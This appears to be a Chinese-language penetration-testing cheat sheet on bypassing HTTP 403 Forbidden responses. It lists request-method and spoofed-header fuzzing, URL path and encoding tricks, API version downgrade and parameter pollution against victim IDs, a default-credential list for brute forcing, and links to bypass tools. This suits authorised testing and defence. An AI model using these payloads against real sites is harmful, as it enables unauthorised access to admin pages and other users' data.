## 403页面绕过技巧
### 1.什么是403？
作为普通用户，我们没有访问特定网页的权限（只能管理员等访问），所以当我们尝试访问该类型的网站时，它会给我们返回 403 forbidden。

### 什么是403绕过？
绕过 403 Forbidden Error 表示客户端能够与服务器通信，但服务器不允许客户端访问所请求的内容。
### 2.HTTP 请求方法fuzz
尝试使用不同的请求方法来访问：` GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK `


### 3.HTTP 标头fuzz
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
```
如果路径受到保护，您可以尝试使用这些其他标头绕过路径保护：
```
X-Original-URL: /admin/console
X-Rewrite-URL: /admin/console
```
### 4.路径fuzz
1. 尝试使用 /%2e/path _（如果访问被代理阻止，这可能会绕过保护），也可以试试_** /%252e**/path（双 URL 编码）
2. 尝试 Unicode 绕过：/%ef%bc%8fpath
#### 其他路径绕过：
```
site.com/secret –> HTTP 403 Forbidden
site.com/SECRET –> HTTP 200 OK
site.com/secret/ –> HTTP 200 OK
site.com/secret/. –> HTTP 200 OK
site.com//secret// –> HTTP 200 OK
site.com/./secret/.. –> HTTP 200 OK
site.com/;/secret –> HTTP 200 OK
site.com/.;/secret –> HTTP 200 OK
site.com//;//secret –> HTTP 200 OK
site.com/secret.json –> HTTP 200 OK 
```
其他api绕过
```
/v3/users_data/1234 --> 403 Forbidden
/v1/users_data/1234 --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:[111]} --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:{“id”:111}} --> 200 OK
{"user_id":"<legit_id>","user_id":"<victims_id>"} (JSON 参数污染)
user_id=ATTACKER_ID&user_id=VICTIM_ID (参数污染)
```
## 更换协议版本
如果使用 HTTP/1.1，请尝试使用 1.0，或者测试看它是否支持 2.0。
## 暴力破解
```
admin    admin
admin    password
admin    1234
admin    admin1234
admin    123456
root     toor
test     test
guest    guest
```
## 自动化工具使用
1. https://github.com/lobuhi/byp4xx
2. https://github.com/iamj0ker/bypass-403
3. https://github.com/gotr00t0day/forbiddenpass
4. Burp扩展：https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122





